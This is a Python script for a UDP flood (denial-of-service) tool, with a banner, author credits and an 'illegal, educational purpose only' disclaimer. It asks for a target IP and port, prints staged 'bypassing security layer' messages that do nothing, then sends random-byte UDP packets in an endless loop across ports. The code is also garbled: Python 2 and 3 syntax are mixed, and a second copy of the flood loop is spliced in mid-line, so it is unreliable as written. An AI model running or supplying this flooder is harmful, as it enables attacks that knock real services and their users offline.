print("\033[92m")

import sys
import os
import time
import socket
import random
from datetime import datetime

# Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Socket Setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
WHITE = '\033[97m'

os.system("clear")

# Stylish Banner
print(GREEN + r"""
██████╗ ██████╗  ██████╗ ███████╗███████╗███████╗███████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
██████╔╝██████╔╝██║   ██║█████╗  █████╗  ███████╗███████╗██║   ██║██████╔╝
██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
██║     ██║  ██║╚██████╔╝██║     ███████╗███████║███████║╚██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
""")

print(GREEN + "══════════════════════════════════════════════════════════════")
print("            CODED BY : SourabhProfessor")
print("            AUTHOR   : SourabhProfessor")
print("            GITHUB   : github.com/SourabhProfessor")
print("══════════════════════════════════════════════════════════════")
print(RED + " NOTE : This Tool Is Illegal & Only For Educational Purpose")
print(" Use It At Your Own Risk, We Aren't Responsible For Actions")
print(GREEN + "══════════════════════════════════════════════════════════════\n")

ip = raw_input(GREEN + "IP Target : ")
port = input(GREEN + "Port      : ")

os.system("clear")

print(GREEN + r"""
██████╗ ██████╗  ██████╗ ███████╗███████╗███████╗███████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
██████╔╝██████╔╝██║   ██║█████╗  █████╗  ███████╗███████╗██║   ██║██████╔╝
██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
██║     ██║  ██║╚██████╔╝██║     ███████╗███████║███████║╚██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
""")

print(GREEN + "\n________________ TRYING TO REACH THE SERVER _________________")
time.sleep(2)

print(GREEN + "________________ ESTABLISHING CONNECTION ____________________")
time.sleep(2)

print(GREEN + "______________ BYPASSING SECURITY LAYER _____________________")
time.sleep(2)

print(GREEN + "________________ CONNECTION ESTABLISHED _____________________")
time.sleep(2)

print(RED + "\nDDOS ATTACK STARTED - EDUCATIONAL PURPOSE ONLY\n")
time.sleep(2)

sent = 0

while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1

    print(GREEN + "Sent %s packet to %s through port:%s" % (sent, ip, port))

    if port == 65534:
        port = 1print "_________________ESTABLISHING CONNECTION_______________________"
time.sleep(5)
print "_________0100100 BYPASSING SECURITY LAYER 001010_______________"
time.sleep(5)
print "_________________CONNECTION ESTABLISHED________________________"
time.sleep(5)
print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
